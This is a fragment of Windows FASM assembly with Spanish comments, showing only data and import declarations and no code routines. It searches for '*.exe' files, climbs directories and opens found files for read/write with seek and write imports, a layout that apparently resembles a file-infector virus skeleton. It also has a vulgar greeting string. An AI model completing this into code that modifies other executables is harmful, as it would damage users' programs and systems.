    ;file params
    DesiredAccess dd GENERIC_READ or GENERIC_WRITE
    ShareMode dd 0
    SecurityAttributes dd 0
    CreationDisposition dd OPEN_EXISTING
    FlagsAndAttributes dd FILE_ATTRIBUTE_NORMAL
    TemplateFile dd 0
    allocated_memory dd ?
    EXIT_MSG db "Exiting from the program!",0

    _allfiles       TCHAR   "*.exe", 0
_updir          TCHAR   "..", 0
_fmt            TCHAR   "%8x %.260s", 10, 0
                align   4
   fileHandle dd ? ; Variable para almacenar el puntero de archivo
   FilePath db  265 dup (0) ,0
   mode db "r", 0
   section '.rdata' readable

    message db '¡Hola,pinche mundo chinga sumadre!', 0
    ERROR_CREATE_DSM db 'Error creating DSM', 0
    error_message db 'Error no especificado', 0
    notify_msg db "Notificacion",0
    next_msg db "Next instruction!",0
    fgetc_error_message db "FGETC error message!",0
   ; Constantes utilizadas para VirtualAlloc
    MEM_RESERVE equ 0x2000
    MEM_COMMIT equ 0x1000
    PAGE_READWRITE equ 0x04
    MEM_RELEASE equ 0x8000


DATAEND dd $

section '.stack' readable writeable
    stack_space equ 4096  ; Tamaño de la pila en bytes
    times stack_space db 0  ; Reservar espacio para la pila


section '.idata' import data readable writeable

 library kernel,'KERNEL32.DLL',\
          user, 'USER32.DLL',\
          MSVCRT, "MSVCRT"

  import kernel,\
           CreateFile, 'CreateFileA',\
           ReadFile, 'ReadFile',\
           WriteFile, 'WriteFile',\
           SetFilePointer, 'SetFilePointer',\
           CloseHandle, 'CloseHandle',\
           ExitProcess, 'ExitProcess',\
           VirtualAlloc, 'VirtualAlloc',\
           VirtualFree, 'VirtualFree',\
           GetLastError, 'GetLastError' ,\
           FindFirstFileA , 'FindFirstFileA',\
           FindNextFileA , 'FindNextFileA' ,\
           FindClose , 'FindClose',\
           SetCurrentDirectory, "SetCurrentDirectoryA"
           import  MSVCRT, printf, "printf" , \
            fopen, 'fopen', \
            fgets, 'fgets', \
            fclose, 'fclose', \
            fseek, 'fseek'
  import user,\
           MessageBoxA, 'MessageBoxA',\
           MessageBoxTimeoutA, 'MessageBoxTimeoutA'


wfd             WIN32_FIND_DATA


END_CODE: